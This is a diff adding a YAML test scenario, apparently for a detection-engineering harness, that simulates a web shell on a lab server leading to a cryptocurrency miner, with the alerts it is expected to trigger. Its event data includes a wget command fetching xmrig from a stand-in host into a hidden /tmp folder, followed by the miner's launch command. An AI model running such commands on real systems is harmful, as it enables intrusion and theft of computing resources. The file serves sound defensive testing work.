@@ -1,0 +1,75 @@
+id: webshell-miner
+title: Web shell leading to a cryptocurrency miner
+description: |
+  A vulnerable PHP application on a lab web server spawns shells, the attacker stages a miner
+  in /tmp and connects it to a mining pool in the documentation range 192.0.2.0/24.
+duration: 20m
+tags: [web-shell, impact, execution]
+expected:
+  alerts_min: 5
+  rules:
+    - aegis-lnx-web-shell-spawn
+    - aegis-corr-discovery-burst
+    - aegis-lnx-exec-from-tmp
+    - aegis-lnx-coin-miner
+    - aegis-lnx-suspicious-port
+    - aegis-intel-indicator-match
+hosts:
+  web:
+    hostname: lab-web-02
+    os: Rocky Linux 9
+    ip: [10.20.0.12]
+steps:
+  - at: 0s
+    event:
+      host: web
+      category: process
+      action: start
+      user: {name: apache, uid: 48}
+      process: {ref: php, name: php-fpm, executable: /usr/sbin/php-fpm, command_line: "php-fpm: pool www"}
+  - at: 30s
+    repeat: {count: 20, every: 50s, jitter: 10s}
+    event:
+      host: web
+      category: network
+      action: accept
+      process: {ref: php, name: php-fpm}
+      network: {direction: inbound, protocol: tcp, src_ip: "10.20.0.{{int:30-80}}", src_port: "{{int:40000-60000}}", dst_ip: host, dst_port: 443}
+  - at: 4m
+    event:
+      host: web
+      category: process
+      action: start
+      user: {name: apache, uid: 48}
+      process: {ref: sh1, parent: php, name: sh, executable: /usr/bin/sh, command_line: "sh -c id"}
+  - at: 4m1s
+    repeat: {count: 5, every: 9s}
+    event:
+      host: web
+      category: process
+      action: start
+      user: {name: apache, uid: 48}
+      process: {parent: sh1, name: "{{cycle:id|whoami|uname|hostname}}", executable: "/usr/bin/{{cycle:id|whoami|uname|hostname}}", command_line: "{{cycle:id|whoami|uname -a|hostname}}"}
+  - at: 6m
+    event:
+      host: web
+      category: process
+      action: start
+      user: {name: apache, uid: 48}
+      process: {ref: sh2, parent: php, name: sh, executable: /usr/bin/sh, command_line: "sh -c wget -q -O /tmp/.x/xmrig http://192.0.2.10/xmrig"}
+  - at: 7m
+    event:
+      host: web
+      category: process
+      action: start
+      user: {name: apache, uid: 48}
+      process: {ref: miner, parent: sh2, name: xmrig, executable: /tmp/.x/xmrig, command_line: "/tmp/.x/xmrig -o stratum+tcp://192.0.2.10:3333 --donate-level 1 -B", hash_sha256: "{{hex:64}}"}
+  - at: 7m5s
+    repeat: {count: 6, every: 2m}
+    event:
+      host: web
+      category: network
+      action: connect
+      user: {name: apache, uid: 48}
+      process: {ref: miner, name: xmrig}
+      network: {direction: outbound, protocol: tcp, src_ip: host, src_port: "{{int:40000-60000}}", dst_ip: 192.0.2.10, dst_port: 3333, state: established}
